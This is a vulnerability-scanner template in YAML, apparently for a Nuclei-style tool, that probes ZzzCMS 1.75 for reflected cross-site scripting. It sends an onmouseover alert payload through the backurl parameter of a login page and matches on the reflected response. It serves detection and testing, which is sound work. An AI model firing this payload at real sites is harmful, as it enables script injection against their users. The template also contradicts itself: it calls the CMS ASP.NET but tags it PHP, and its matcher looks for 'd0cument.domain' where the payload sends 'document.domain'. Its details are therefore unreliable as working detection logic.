id: "zzzcms-xss"
name: "Zzzcms 1.75 - Cross-Site Scripting"
severity: "medium"
description: "ZzzCMS ( A Lightweight ASP.NET content management system ) is vulnerable to XSS( Cross-Site Scripting )."
tech:
  - "php"
tags:
  - "zzzcms"
  - "xss"
  - "vuln"
reference: "https://github.com/Ares-X/VulWiki/blob/master/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.75%20xss%E6%BC%8F%E6%B4%9E.md"
spaExclusion: true
request:
  method: "GET"
  path: "/plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "onmouseover=alert(/d0cument.domain/) y=&act"
      - "document.write(\""
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
